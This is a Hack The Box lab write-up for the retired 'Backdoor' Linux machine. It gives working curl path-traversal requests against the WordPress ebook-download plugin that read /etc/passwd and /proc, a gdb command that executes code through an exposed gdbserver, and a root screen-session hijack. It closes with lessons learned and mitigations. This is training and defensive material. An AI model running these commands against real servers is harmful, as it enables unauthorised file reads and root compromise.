---
machine: Backdoor
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, wordpress, traversal, gdbserver, screen]
---

# Backdoor — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A WordPress plugin allows path traversal and reading `/proc`. Enumeration reveals an exposed `gdbserver` and a root `screen` session with multiuser enabled, allowing attachment and root execution.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
wpscan --url http://backdoor.htb --enumerate vp
curl "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../etc/passwd"
curl "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../proc/net/tcp"
# local gdbserver
 gdb -q -ex "target remote 127.0.0.1:1337" -ex "call system(\"id\")"
screen -ls
screen -x root/root
```

## Enumeration

- WordPress with the `ebook-download` plugin and a download parameter.
- `/proc/net/tcp` shows an internal `gdbserver` port.
- Root keeps an accessible `screen` session.

## Initial access

The `ebookdownloadurl` parameter accepts `../` and reads files. Inspect processes and sockets in `/proc`, discover `gdbserver` and use it to execute code in the debugged process context.

## Privilege escalation

The root `screen` session has multiuser enabled. `screen -ls` finds it and `screen -x root/root` attaches without authentication, giving a root shell.

## Evidence

- `/etc/passwd` read through traversal.
- `gdbserver` reached from loopback and `id` execution.
- `screen -x root/root` with a root prompt.

## Lessons learned

- An outdated plugin can expose the whole filesystem.
- Loopback debug sockets are execution when reachable.
- Multiuser `screen` is a door when root leaves sessions open.

## Mitigation and detection

- Update plugins and validate download paths.
- Do not expose `gdbserver`; run it only under controlled debugging.
- Disable `screen` multiuser and close root sessions.

## References

- [0xdf — Backdoor](https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html)
- [GNU Screen — manual](https://www.gnu.org/software/screen/manual/screen.html)
- [Hack The Box — Backdoor](https://app.hackthebox.com/machines/backdoor)
